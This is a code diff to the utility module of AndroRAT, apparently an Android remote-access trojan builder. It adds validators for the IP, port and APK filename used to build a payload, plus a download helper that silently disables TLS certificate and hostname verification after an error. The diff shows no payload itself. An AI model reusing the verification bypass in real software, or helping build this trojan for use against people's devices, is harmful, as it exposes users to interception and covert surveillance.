@@ -15,16 +15,19 @@ import socket
 import threading
 import itertools
 import queue
+import ssl
+import urllib.request
+import urllib.error
 
 sys.stdout.reconfigure(encoding='utf-8')
 
-banner = """\033[1m\033[91m
+banner = r"""\033[1m\033[91m
                     _           _____         _______
-    /\\             | |         |  __ \\     /\\|__   __|
-   /  \\   _ __   __| |_ __ ___ | |__) |   /  \\  | |   
-  / /\\ \\ | '_ \\ / _` | '__/ _ \\|  _  /   / /\\ \\ | |   
- / ____ \\| | | | (_| | | | (_) | | \\ \\  / ____ \\| |   
-/_/    \\_\\_| |_|\\__,_|_|  \\___/|_|  \\_\\/_/    \\_\\_|
+    /\             | |         |  __ \     /\|__   __|
+   /  \   _ __   __| |_ __ ___ | |__) |   /  \  | |   
+  / /\ \ | '_ \ / _` | '__/ _ \|  _  /   / /\ \ | |   
+ / ____ \| | | | (_| | | | (_) | | \ \  / ____ \| |   
+/_/    \_\_| |_|\__,_|_|  \___/|_|  \_\/_/    \_\_|
 
                                        \033[93m- By karma9874
 """
@@ -56,17 +59,178 @@ def clearDirec():
         direc = "/"
     return clear,direc
 
+def setup_ssl_context():
+    """
+    Setup SSL context to handle certificate issues.
+    This is needed for downloading files when certificates are expired or invalid.
+    """
+    try:
+        # Create unverified SSL context (use with caution)
+        ssl_context = ssl.create_default_context()
+        ssl_context.check_hostname = False
+        ssl_context.verify_mode = ssl.CERT_NONE
+        
+        # Install the handler
+        handler = urllib.request.HTTPSHandler(context=ssl_context)
+        opener = urllib.request.build_opener(handler)
+        urllib.request.install_opener(opener)
+        
+        return True
+    except Exception as e:
+        print(stdOutput("warning") + f"\033[1mSSL context setup failed: {str(e)}")
+        return False
+
+def safe_download(url, filename=None, max_retries=3):
+    """
+    Safely download a file with SSL certificate error handling.
+    
+    Args:
+        url: URL to download from
+        filename: Local filename to save to (optional)
+        max_retries: Maximum number of retry attempts
+        
+    Returns:
+        tuple: (success: bool, content: bytes or filename: str, error: str)
+    """
+    
+    for attempt in range(max_retries):
+        try:
+            # Try normal download first
+            response = urllib.request.urlopen(url, timeout=30)
+            content = response.read()
+            
+            if filename:
+                with open(filename, 'wb') as f:
+                    f.write(content)
+                return True, filename, None
+            else:
+                return True, content, None
+                
+        except urllib.error.URLError as e:
+            if "CERTIFICATE_VERIFY_FAILED" in str(e):
+                print(stdOutput("warning") + f"\033[1mSSL certificate error on attempt {attempt + 1}")
+                
+                if attempt == 0:
+                    # Setup unverified SSL context and retry
+                    print(stdOutput("info") + "\033[1mTrying with unverified SSL context...")
+                    setup_ssl_context()
+                    continue
+                    
+            print(stdOutput("error") + f"\033[1mDownload failed: {str(e)}")
+            
+        except Exception as e:
+            print(stdOutput("error") + f"\033[1mUnexpected error: {str(e)}")
+            
+        if attempt < max_retries - 1:
+            print(stdOutput("info") + f"\033[1mRetrying in 2 seconds... ({attempt + 2}/{max_retries})")
+            time.sleep(2)
+    
+    return False, None, "Download failed after all retries"
+
 clear,direc = clearDirec()
 if not os.path.isdir(os.getcwd()+direc+"Dumps"):
     os.makedirs("Dumps")
 
 def is_valid_ip(ip):
-    m = re.match(r"^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$", ip)
-    return bool(m) and all(map(lambda n: 0 <= int(n) <= 255, m.groups()))
+    """
+    Validate IP address format.
+    
+    Args:
+        ip: IP address string to validate
+        
+    Returns:
+        bool: True if valid IP address
+    """
+    if not ip:
+        return False
+        
+    try:
+        m = re.match(r"^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$", ip)
+        if not m:
+            return False
+            
+        # Check each octet is in valid range
+        octets = [int(x) for x in m.groups()]
+        return all(0 <= octet <= 255 for octet in octets)
+        
+    except (ValueError, AttributeError):
+        return False
 
 def is_valid_port(port):
-    i = 1 if port.isdigit() and len(port)>1  else  0
-    return i
+    """
+    Validate port number.
+    
+    Args:
+        port: Port number (string or int) to validate
+        
+    Returns:
+        bool: True if valid port number
+    """
+    try:
+        if isinstance(port, str):
+            if not port.isdigit():
+                return False
+            port_num = int(port)
+        else:
+            port_num = int(port)
+            
+        return 1 <= port_num <= 65535
+        
+    except (ValueError, TypeError):
+        return False
+
+def is_valid_filename(filename):
+    """
+    Validate filename for APK output.
+    
+    Args:
+        filename: Filename to validate
+        
+    Returns:
+        bool: True if valid filename
+    """
+    if not filename:
+        return False
+        
+    # Check for invalid characters
+    invalid_chars = ['<', '>', ':', '"', '/', '\\', '|', '?', '*']
+    if any(char in filename for char in invalid_chars):
+        return False
+        
+    # Check length
+    if len(filename) > 255:
+        return False
+        
+    # Ensure it has .apk extension or add it
+    if not filename.lower().endswith('.apk'):
+        return False
+        
+    return True
+
+def validate_build_args(ip, port, output_file):
+    """
+    Validate all arguments for APK building.
+    
+    Args:
+        ip: IP address
+        port: Port number  
+        output_file: Output APK filename
+        
+    Returns:
+        tuple: (valid: bool, errors: list)
+    """
+    errors = []
+    
+    if ip and not is_valid_ip(ip):
+        errors.append(f"Invalid IP address: {ip}")
+        
+    if port and not is_valid_port(port):
+        errors.append(f"Invalid port number: {port}")
+        
+    if output_file and not is_valid_filename(output_file):
+        errors.append(f"Invalid filename: {output_file}")
+        
+    return len(errors) == 0, errors
 
 def execute(command):
     return run(command, stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)
